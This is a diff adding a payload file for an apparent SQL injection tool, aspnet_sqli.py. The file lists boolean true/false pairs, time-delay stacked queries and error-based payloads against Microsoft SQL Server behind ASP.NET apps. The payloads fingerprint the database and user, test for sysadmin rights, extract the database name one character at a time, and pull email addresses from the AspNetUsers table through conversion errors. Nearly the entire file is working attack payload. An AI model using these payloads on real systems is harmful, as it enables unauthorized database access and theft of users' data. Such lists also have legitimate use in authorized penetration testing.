@@ -1,0 +1,75 @@
+# ── mssql_pairs.txt ───────────────────────────────────────────────────────────
+# Boolean-pair payloads for aspnet_sqli.py
+# TRUE and FALSE lines MUST be the same length to be reflection-immune.
+# The tool warns you if they're not.
+#
+# Format:
+#   TRUE:  <payload that should evaluate true in SQL>
+#   FALSE: <payload that should evaluate false in SQL>
+#
+# Injection confirmed when TRUE and FALSE produce different responses.
+
+# ── Tautology vs contradiction ─────────────────────────────────────────────────
+TRUE:  ss' AND 1=1-- wXyW
+FALSE: ss' AND 1=2-- wXyW
+
+TRUE:  ss' AND 'x'='x'--xxxxx
+FALSE: ss' AND 'x'='y'--xxxxx
+
+TRUE:  ss' AND 2>1-- wXyWx
+FALSE: ss' AND 2<1-- wXyWx
+
+# ── Subquery true/false ────────────────────────────────────────────────────────
+TRUE:  ss' AND (SELECT COUNT(*) FROM sysobjects)>0-- wXyW
+FALSE: ss' AND (SELECT COUNT(*) FROM sysobjects)<0-- wXyW
+
+# ── AspNetUsers table existence ────────────────────────────────────────────────
+TRUE:  ss' AND (SELECT COUNT(*) FROM AspNetUsers)>-1-- wXyW
+FALSE: ss' AND (SELECT COUNT(*) FROM AspNetUsers)<-1-- wXyW
+
+# ── DB_NAME() length binary search ────────────────────────────────────────────
+TRUE:  ss' AND LEN(DB_NAME())>0-- wXyWx
+FALSE: ss' AND LEN(DB_NAME())<0-- wXyWx
+
+TRUE:  ss' AND LEN(DB_NAME())>5-- wXyWx
+FALSE: ss' AND LEN(DB_NAME())<5-- wXyWx
+
+TRUE:  ss' AND LEN(DB_NAME())>3-- wXyWxx
+FALSE: ss' AND LEN(DB_NAME())>99-- wXyWx
+
+# ── SYSTEM_USER checks ─────────────────────────────────────────────────────────
+TRUE:  ss' AND LEN(SYSTEM_USER)>0-- wXyWx
+FALSE: ss' AND LEN(SYSTEM_USER)<0-- wXyWx
+
+# ── Sysadmin check ────────────────────────────────────────────────────────────
+TRUE:  ss' AND IS_SRVROLEMEMBER('sysadmin')>=0-- wXyW
+FALSE: ss' AND IS_SRVROLEMEMBER('sysadmin')<-1-- wXyW
+
+# ── DB_NAME() first char — binary search (A=65, Z=90, a=97, z=122) ───────────
+TRUE:  ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64-- wXyW
+FALSE: ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))<64-- wXyW
+
+TRUE:  ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>80-- wXyW
+FALSE: ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))<80-- wXyW
+
+TRUE:  ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>72-- wXyW
+FALSE: ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))<72-- wXyW
+
+TRUE:  ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>68-- wXyW
+FALSE: ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))<68-- wXyW
+
+# ── SYSTEM_USER first char ────────────────────────────────────────────────────
+TRUE:  ss' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>64-- wXyW
+FALSE: ss' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))<64-- wXyW
+
+# ── Time-based confirmation (no pair — timing is the signal) ─────────────────
+# These are singles — a 5s+ response confirms stacked query execution
+ss'; WAITFOR DELAY '0:0:5'-- wXyW
+ss'; IF (1=1) WAITFOR DELAY '0:0:5'-- wXyWxxxx
+ss'; IF (1=2) WAITFOR DELAY '0:0:5'-- wXyWxxxx
+
+# ── Error-based singles (no pair — error text is the signal) ─────────────────
+ss' AND 1=CONVERT(int,@@version)-- wXyW
+ss' AND 1=CONVERT(int,DB_NAME())-- wXyWx
+ss' AND 1=CONVERT(int,SYSTEM_USER)-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email))-- wXyW
